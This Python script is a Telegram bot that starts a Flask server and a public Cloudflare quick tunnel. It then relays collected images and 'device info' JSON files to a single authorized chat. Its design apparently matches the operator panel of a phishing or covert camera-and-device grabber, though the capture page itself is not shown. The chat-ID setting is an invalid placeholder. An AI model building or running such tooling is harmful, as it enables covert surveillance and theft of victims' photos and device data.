from telegram.ext import ApplicationBuilder, CommandHandler
import subprocess
import re
import os

# =========================
# CONFIG
# =========================

BOT_TOKEN = "BOT TOKEN"
AUTHORIZED_CHAT_ID = chat id 

flask_process = None
cloudflared_process = None

# =========================
# CREATE FOLDERS
# =========================

os.makedirs("images", exist_ok=True)
os.makedirs("sent", exist_ok=True)

os.makedirs("metadata", exist_ok=True)
os.makedirs("infos_sent", exist_ok=True)

# =========================
# START SERVER
# =========================

async def start(update, context):

    global flask_process
    global cloudflared_process

    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    if flask_process is None:

        # START FLASK
        flask_process = subprocess.Popen(
            ["python", "app.py"]
        )

        # START CLOUDFLARED
        cloudflared_process = subprocess.Popen(
            [
                "cloudflared",
                "tunnel",
                "--url",
                "http://localhost:5000"
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        tunnel_url = None

        # GET URL
        for line in cloudflared_process.stdout:

            match = re.search(
                r"https://[-a-z0-9]+\.trycloudflare\.com",
                line
            )

            if match:
                tunnel_url = match.group(0)
                break

        if tunnel_url:

            await update.message.reply_text(
                f"✅ Server Started\n🌍 {tunnel_url}"
            )

        else:

            await update.message.reply_text(
                "⚠️ Cloudflare URL not found"
            )

    else:

        await update.message.reply_text(
            "⚠️ Server already running"
        )

# =========================
# STOP SERVER
# =========================

async def stop(update, context):

    global flask_process
    global cloudflared_process

    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    try:

        if flask_process:
            flask_process.kill()
            flask_process = None

        if cloudflared_process:
            cloudflared_process.kill()
            cloudflared_process = None

        await update.message.reply_text(
            "🛑 Server stopped"
        )

    except Exception as e:

        await update.message.reply_text(
            f"❌ Error:\n{e}"
        )

# =========================
# SERVER STATUS
# =========================

async def status(update, context):

    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    if flask_process:

        await update.message.reply_text(
            "🟢 Server online"
        )

    else:

        await update.message.reply_text(
            "🔴 Server offline"
        )

# =========================
# GET IMAGES
# =========================

async def images(update, context):

    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    images_folder = "images"
    sent_folder = "sent"

    os.makedirs(sent_folder, exist_ok=True)

    # FILTER ONLY IMAGES
    files = [
        f for f in os.listdir(images_folder)
        if f.lower().endswith((".png", ".jpg", ".jpeg"))
    ]

    files.sort()

    if len(files) == 0:

        await update.message.reply_text(
            "⚠️ No new images found"
        )

        return

    await update.message.reply_text(
        f"📸 Sending {len(files)} new images..."
    )

    for file in files:

        image_path = os.path.join(images_folder, file)
        sent_path = os.path.join(sent_folder, file)

        try:

            # SEND IMAGE
            with open(image_path, "rb") as img:

                await update.message.reply_photo(
                    photo=img
                )

            # MOVE TO SENT
            os.replace(image_path, sent_path)

        except Exception as e:

            await update.message.reply_text(
                f"❌ Failed:\n{file}\n\n{e}"
            )

# =========================
# GET INFOS
# =========================

async def infos(update, context):

    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    metadata_folder = "metadata"
    sent_folder = "infos_sent"

    os.makedirs(sent_folder, exist_ok=True)

    # FILTER ONLY JSON FILES
    files = [
        f for f in os.listdir(metadata_folder)
        if f.endswith(".json")
    ]

    files.sort()

    if len(files) == 0:

        await update.message.reply_text(
            "📭 No new metadata yet"
        )

        return

    latest_file = files[-1]

    metadata_path = os.path.join(
        metadata_folder,
        latest_file
    )

    sent_path = os.path.join(
        sent_folder,
        latest_file
    )

    try:

        with open(metadata_path, "r") as f:

            data = f.read()

        await update.message.reply_text(
            f"📄 Latest Device Info:\n\n{data}"
        )

        # MOVE TO infos_sent
        os.replace(
            metadata_path,
            sent_path
        )

    except Exception as e:

        await update.message.reply_text(
            f"❌ Error:\n{e}"
        )

# =========================
# BOT
# =========================

app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("stop", stop))
app.add_handler(CommandHandler("status", status))
app.add_handler(CommandHandler("images", images))
app.add_handler(CommandHandler("infos", infos))

print("🤖 Bot running...")

app.run_polling()
